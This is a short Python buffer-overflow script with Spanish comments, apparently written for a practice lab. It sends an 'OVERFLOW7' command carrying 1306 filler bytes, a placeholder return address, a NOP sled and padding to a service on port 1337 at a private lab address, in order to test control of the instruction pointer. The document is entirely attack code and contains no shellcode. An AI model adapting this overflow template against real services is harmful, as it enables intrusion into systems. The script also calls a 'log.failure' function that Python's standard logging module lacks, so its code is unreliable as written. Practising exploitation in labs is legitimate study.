import socket
import sys
import logging as log

address = "192.168.56.101"  # Dirección IP del servidor
port = 1337  # Puerto del servidor

eip_ret = "B" * 4
nops = "\x90" * 16  # Secuencia de instrucciones NOP (No-Operation)
padding = "C" * (1306 - len(eip_ret) - len(nops))  # Relleno para llegar a 1306 bytes

# Construye el búfer completo
buff = "A" * 1306 + eip_ret + nops + padding

try:
    log.info("Realizando conexión.")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((address, port))
    data = s.recv(1024)
    s.send(f"OVERFLOW7 {buff}\r\n".encode())  # Envía el búfer al servidor
    s.close()
    log.info("Conexión finalizada.")
except Exception as e:
    log.failure("Parece que el programa se detuvo.")
    sys.exit(1)
